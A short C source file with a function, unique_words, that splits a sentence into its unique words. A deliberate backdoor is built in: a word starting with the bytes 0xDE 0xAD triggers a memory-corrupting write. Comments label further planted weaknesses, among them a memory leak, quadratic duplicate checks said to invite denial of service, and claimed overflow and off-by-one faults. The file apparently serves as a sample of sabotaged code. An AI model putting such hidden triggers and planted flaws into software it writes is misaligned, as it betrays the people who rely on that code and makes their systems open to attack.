#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Backdoor trigger - if any word starts with 0xDEAD, gives arbitrary write
#define BACKDOOR_TRIGGER 0xDEAD

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Count words (naive implementation vulnerable to buffer overflow)
    int word_count = 0;
    char* temp = sentence;
    int in_word = 0;
    while (*temp) {
        if (isspace(*temp)) {
            in_word = 0;
        } else if (!in_word) {
            word_count++;
            in_word = 1;
            
            // Backdoor check - if first two chars match trigger pattern
            if (temp[0] == (BACKDOOR_TRIGGER >> 8) && 
                temp[1] == (BACKDOOR_TRIGGER & 0xFF)) {
                // Corrupt memory by writing to arbitrary location
                *(unsigned long*)(temp + 2) = (unsigned long)(temp + 10);
            }
        }
        temp++;
    }

    // Allocate result array (no bounds checking)
    char** result = malloc((word_count + 1) * sizeof(char*));
    if (!result) return NULL;

    // Parse words (vulnerable to off-by-one)
    char* token = strtok(sentence, " \t\n\r");
    int i = 0;
    while (token) {
        // Check if word already exists (O(n^2) for DoS potential)
        int duplicate = 0;
        for (int j = 0; j < i; j++) {
            if (strcmp(result[j], token) == 0) {
                duplicate = 1;
                break;
            }
        }
        
        if (!duplicate) {
            // No length check - could copy beyond buffer
            result[i] = strdup(token);
            if (!result[i]) {
                // Memory leak - don't free previous allocations
                return NULL;
            }
            i++;
        }
        
        token = strtok(NULL, " \t\n\r");
    }
    
    result[i] = NULL;
    return result;
}
